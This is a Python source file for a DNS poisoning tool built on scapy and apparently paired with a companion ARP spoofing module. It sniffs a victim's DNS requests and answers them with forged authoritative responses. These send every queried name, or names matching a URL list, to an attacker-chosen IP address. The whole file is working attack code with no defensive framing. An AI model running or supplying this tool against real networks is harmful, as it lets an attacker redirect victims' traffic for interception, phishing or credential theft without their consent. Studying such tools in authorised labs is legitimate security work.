import sys
import time
import threading
from scapy.all import *
from ArpSpoofing import ArpSpoofing

class DnsPoisoning:
    interface = 0
    def __init__(self, intFace):
        self.interface = intFace

    def doPoison(self, target1, target2, target1MAC, target2MAC, url, ipPoison, stop_event):

        def makeFakeResponse(pkt, ipVictim, url, ipPoison, interface):
            # check if the packet (is a DNS packet) AND (comes from the target)
            if pkt.haslayer(DNS) and ((ipVictim is None) or (pkt[IP].src == ipVictim)):
                # check if the dns packet (is a request)
                if (pkt[DNS].qr == 0):
                    # check if the dns packet concerns the target URL
                    if len(url) == 0:
                        print("{} sent a DNS request. ".format(pkt[IP].src))
                        # for a response revert destination and source
                        fakeEther = Ether(src=pkt[Ether].dst, dst=pkt[Ether].src)
                        fakeIP = IP(src=pkt[IP].dst, dst=pkt[IP].src)
                        fakeUDP = UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport)
                        # fake query pointing the requested URL to the poison IP
                        fakeDNSRR = DNSRR(rrname=pkt[DNS].qd.qname, rdata=ipPoison)
                        # fake DNS response
                        fakeDNS = DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd, an=fakeDNSRR)
                        # combine into complete packet
                        poisonPacket = fakeEther / fakeIP / fakeUDP / fakeDNS
                        # send the poison packet to the victim
                        sendp(poisonPacket, verbose=0, iface=interface)
                        print("Fake DNS response sent to {} .".format(poisonPacket[IP].dst))
                    else:
                        for link in url:
                            if link in pkt[DNS].qd.qname:
                                print("{} wants to connect to {} .".format(pkt[IP].src, link))
                                # for a response revert destination and source
                                fakeEther = Ether(src=pkt[Ether].dst, dst=pkt[Ether].src)
                                fakeIP = IP(src=pkt[IP].dst, dst=pkt[IP].src)
                                fakeUDP = UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport)
                                # fake query pointing the requested URL to the poison IP
                                fakeDNSRR = DNSRR(rrname=pkt[DNS].qd.qname, rdata=ipPoison)
                                # fake DNS response
                                fakeDNS = DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd, an=fakeDNSRR)
                                # combine into complete packet
                                poisonPacket = fakeEther / fakeIP / fakeUDP / fakeDNS
                                # send the poison packet to the victim
                                sendp(poisonPacket, verbose=0, iface=interface)
                                print("Fake DNS response sent to {} .".format(poisonPacket[IP].dst))

        while not stop_event.is_set():
            for ip in target1:
                sniff(count=1, store=0, prn=lambda pkt: makeFakeResponse(pkt, ip, url, ipPoison, self.interface),iface=self.interface)
        print("DNS poisoning is stopped.")
